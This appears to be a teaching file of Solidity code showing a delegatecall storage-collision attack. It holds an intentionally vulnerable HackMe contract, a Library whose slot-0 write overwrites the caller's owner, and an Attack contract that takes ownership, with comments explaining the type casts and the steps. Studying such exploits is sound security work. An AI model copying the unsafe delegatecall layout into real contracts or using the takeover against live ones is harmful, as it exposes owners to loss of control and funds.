



// Attacker exploits storage collision to take ownership
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Vulnerable Contract
contract HackMe {
    address public owner; // Slot 0 overwrites by atacker 
    address public lib;   // Slot 1

    constructor(address _lib) {
        owner = msg.sender; // Owner is set to the deployer
        lib = _lib;
    }

    function setNum(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}

// Library Contract (Trusted by HackMe but vulnerable)
contract Library {
    uint256 public num; // This is stored in slot 0

    function setNum(uint256 _num) public {
        num = _num; // This modifies the caller's slot 0
    }
}

// Attacker Contract
contract Attack {
    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.setNum(uint256(uint160(address(this)))); // Overwrites HackMe's owner with attacker's address
    
    //attacker becomes owner of the HAck me contract
    }
}

//0xd16B472C1b3AB8bc40C1321D7b33dB857e823f01

// msg.sender is the attacker's address (which is 20 bytes in Ethereum).
// uint160(msg.sender):
// Ethereum addresses are 160-bit (20 bytes).
// uint160(msg.sender) converts the address into a 160-bit unsigned integer.
// uint256(uint160(msg.sender)):
// setNum(uint256) expects a 256-bit (uint256) input.
// Since uint256 is 32 bytes (256 bits), the uint160 value is expanded into uint256.

1. Hack me Contract is uses the Libray Contract to manipulate the storage 
2.Attacker send their address to the hack me contract in the form of unit256(uint160(address(this))).
3.According to the Library contract changes applies to the storage layout. 
so slot 0 is change.

